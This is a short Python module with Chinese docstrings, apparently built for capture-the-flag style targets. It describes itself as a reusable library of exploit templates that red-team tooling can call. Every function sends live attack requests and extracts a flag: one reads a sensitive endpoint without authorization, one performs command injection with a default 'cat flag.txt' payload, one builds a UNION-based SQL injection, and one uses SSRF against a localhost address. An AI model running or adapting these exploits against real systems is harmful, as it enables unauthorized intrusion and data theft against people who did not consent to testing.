"""PoC 利用模板库（独立可复用模块）。

提供常见 Web 漏洞的真实利用函数，直接对目标发请求并提取 flag{...}。
既可被红队编排层调用，也可作为独立 PoC 库交付 / 在应急响应中复用。
"""
from __future__ import annotations

from typing import Optional

from ..tools.exploit import extract_flag
from ..tools.recon import http_get


def unauthorized_access(flag_url: str) -> Optional[str]:
    """未授权访问敏感接口，直接读取并返回 flag。"""
    st, h, b = http_get(flag_url, timeout=8)
    return extract_flag(b)


def command_injection(endpoint: str, payload: str = "cat flag.txt", param: str = "input") -> Optional[str]:
    """命令注入：向指定端点参数注入命令并提取回显中的 flag。"""
    sep = "?" if "?" not in endpoint else "&"
    url = f"{endpoint}{sep}{param}={payload}"
    st, h, b = http_get(url, timeout=8)
    return extract_flag(b)


def sqli_union(target: str, column_count: int = 3, param: str = "id") -> Optional[str]:
    """SQL 注入（联合查询模板）：尝试从联合查询中拖出 flag 列。"""
    cols = ",".join("flag" if i == 2 else str(i) for i in range(1, column_count + 1))
    payload = f"' UNION SELECT {cols}-- "
    sep = "?" if "?" not in target else "&"
    url = f"{target}{sep}{param}={payload}"
    st, h, b = http_get(url, timeout=8)
    return extract_flag(b)


def ssrf_internal(endpoint: str, internal_url: str = "http://127.0.0.1/flag", param: str = "url") -> Optional[str]:
    """SSRF：诱导服务端访问内网敏感地址并回显 flag。"""
    sep = "?" if "?" not in endpoint else "&"
    url = f"{endpoint}{sep}{param}={internal_url}"
    st, h, b = http_get(url, timeout=8)
    return extract_flag(b)


__all__ = ["unauthorized_access", "command_injection", "sqli_union", "ssrf_internal", "extract_flag"]
